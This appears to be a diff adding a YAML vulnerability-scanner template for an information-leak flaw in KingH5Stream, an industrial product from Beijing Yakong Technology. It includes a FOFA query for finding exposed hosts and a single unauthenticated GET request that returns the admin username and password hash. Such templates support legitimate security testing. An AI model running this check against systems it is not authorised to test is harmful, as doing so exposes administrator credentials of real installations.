@@ -1,0 +1,16 @@
+id: poc-yaml-kingh5stream-getuserinfo-info-leak
+info:
+  name: 北京亚控科技KingH5Stream GetUserInfo 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: kingh5stream
+  fofa: body="kingH5stream"
+requests:
+- method: GET
+  path: /api/v1/GetUserInfo?user=admin&session=
+  expression: "status_code == 200 && \ncontains(body,\"\\\"strUser\\\"\\x3a \\\"admin\\\
+    \"\") &&\nmatches(body,\"\\\"strPasswd\\\"\\x3a \\\"[0-9a-zA-Z]{32}\\\"\") &&\n\
+    contains(content_type,\"application/json\")\n"
+variables: {}
+transport: http
